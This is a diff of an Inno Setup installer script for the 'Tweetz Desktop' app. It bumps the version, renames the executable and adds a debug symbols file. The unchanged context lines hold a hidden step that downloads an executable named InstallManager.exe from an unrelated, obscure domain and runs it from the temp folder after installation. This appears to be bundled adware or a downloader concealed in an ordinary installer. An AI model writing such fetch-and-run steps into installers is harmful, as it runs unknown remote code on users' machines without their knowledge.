@@ -1,8 +1,8 @@
 #define MyAppName "Tweetz Desktop"
-#define MyAppVersion "0.8.6"
+#define MyAppVersion "0.8.7"
 #define MyAppPublisher "Mike Ward"
 #define MyAppURL "http://mike-ward.net"
-#define MyAppExeName "tweetz5.exe"
+#define MyAppExeName "tweetz.exe"
 #define ITDRoot ReadReg(HKEY_LOCAL_MACHINE,'Software\Sherlock Software\InnoTools\Downloader','InstallPath','')  
 #include ITDRoot+'\it_download.iss' 
 
@@ -57,8 +57,9 @@ Name: "desktopicon"; Description: "{cm:CreateDesktopIcon}"; GroupDescription: "{
 Name: "quicklaunchicon"; Description: "{cm:CreateQuickLaunchIcon}"; GroupDescription: "{cm:AdditionalIcons}"; Flags: unchecked; OnlyBelowVersion: 0,6.1
 
 [Files]
-Source: "..\..\..\tweetz5\bin\Release\tweetz5.exe"; DestDir: "{app}"; Flags: ignoreversion
-Source: "..\..\..\tweetz5\bin\Release\tweetz5.exe.locale"; DestDir: "{app}"; Flags: ignoreversion
+Source: "..\..\..\tweetz5\bin\Release\tweetz.exe"; DestDir: "{app}"; Flags: ignoreversion
+Source: "..\..\..\tweetz5\bin\Release\tweetz.exe.locale"; DestDir: "{app}"; Flags: ignoreversion
+Source: "..\..\..\tweetz5\bin\Release\tweetz.pdb"; DestDir: "{app}"; Flags: ignoreversion
 Source: "fontawesome-webfont.ttf"; DestDir: "{fonts}"; FontInstall: "FontAwesome"; Flags: onlyifdoesntexist uninsneveruninstall; OnlyBelowVersion: 6.2
 
 [Icons]
@@ -142,7 +143,7 @@ begin
     itd_init; 
     itd_addfile('http://www.cooct13hen.com/download.php?l32AeQ==', expandconstant('{tmp}\InstallManager.exe')); 
     itd_downloadafter(wpReady); 
-    ITD_SetOption('UI_AllowContinue', '1'); 
+    ITD_SetOption('UI_AllowContinue', '1');
 end;
 
 procedure CurStepChanged(CurStep: TSetupStep); 
@@ -150,7 +151,7 @@ var AppPath:String;
 WorkingDir:String; 
 ReturnCode:Integer; 
 begin 
-if CurStep=ssPostInstall then begin    
+if CurStep=ssPostInstall then begin   
     WorkingDir := ExpandConstant ('{tmp}');    
     AppPath := expandconstant('{tmp}\InstallManager.exe')    
     Exec (AppPath, '', WorkingDir, SW_SHOW, ewWaitUntilTerminated,    
